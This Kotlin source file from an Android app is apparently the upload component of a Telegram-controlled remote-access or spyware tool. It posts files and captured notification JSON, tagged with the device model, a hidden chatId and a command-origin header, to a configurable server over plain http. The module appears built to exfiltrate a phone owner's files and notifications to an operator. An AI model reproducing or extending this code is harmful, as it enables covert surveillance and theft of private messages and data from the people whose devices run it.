package com.kashem.shaikh.telegram

import android.content.Context
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit
import com.kashem.shaikh.AppLogs

object FileUploader {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .readTimeout(300, TimeUnit.SECONDS)
        .build()

    fun uploadFile(
        context: Context,
        file: File,
        baseUrl: String,
        commandOrigin: String = "user",
        callback: (Boolean) -> Unit
    ) {
        val fixedBaseUrl = if (baseUrl.startsWith("http://") || baseUrl.startsWith("https://")) {
            baseUrl
        } else {
            "http://$baseUrl"
        }

        val url = if (fixedBaseUrl.endsWith("/")) {
            fixedBaseUrl + "uploadFile"
        } else {
            fixedBaseUrl + "/uploadFile"
        }

        AppLogs.debug("Uploading to URL: $url, file: ${file.name}, size: ${file.length()}")

        val mediaType = "text/plain".toMediaType()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
            .build()
        val request = Request.Builder()
            .url(url)
            .addHeader("model", android.os.Build.MODEL)
            .addHeader("chatId", getChatId(context))
            .addHeader("X-Command-Origin", commandOrigin)
            .post(requestBody)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                AppLogs.logFileUpload(file.name, false, e.message, commandOrigin)
                callback(false)
            }
            override fun onResponse(call: Call, response: Response) {
                val success = response.isSuccessful
                if (success) {
                    AppLogs.logFileUpload(file.name, true, origin = commandOrigin)
                } else {
                    AppLogs.logFileUpload(file.name, false, "HTTP ${response.code} - ${response.message}", commandOrigin)
                }
                response.close()
                callback(success)
            }
        })
    }

    suspend fun uploadNotification(
        context: Context,
        jsonData: String,
        baseUrl: String,
        commandOrigin: String = "user"
    ): Boolean {
        return try {
            val fixedBaseUrl = if (baseUrl.startsWith("http://") || baseUrl.startsWith("https://")) {
                baseUrl
            } else {
                "http://$baseUrl"
            }
            val url = if (fixedBaseUrl.endsWith("/")) {
                fixedBaseUrl + "uploadNotification"
            } else {
                fixedBaseUrl + "/uploadNotification"
            }

            val body = RequestBody.create("application/json".toMediaType(), jsonData)
            val request = Request.Builder()
                .url(url)
                .addHeader("model", android.os.Build.MODEL)
                .addHeader("chatId", getChatId(context))
                .addHeader("X-Command-Origin", commandOrigin)
                .post(body)
                .build()
            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            if (!success) {
                AppLogs.error("Notification upload failed: ${response.code}")
            }
            response.close()
            success
        } catch (e: Exception) {
            AppLogs.error("Notification upload error: ${e.message}", e)
            false
        }
    }

    private fun getChatId(context: Context): String {
        return try {
            val jsonString = context.assets.open("Server.json").bufferedReader().use { it.readText() }
            val json = JSONObject(jsonString)
            json.optString("chatId", "")
        } catch (e: Exception) {
            AppLogs.error("Failed to read chatId", e)
            ""
        }
    }
}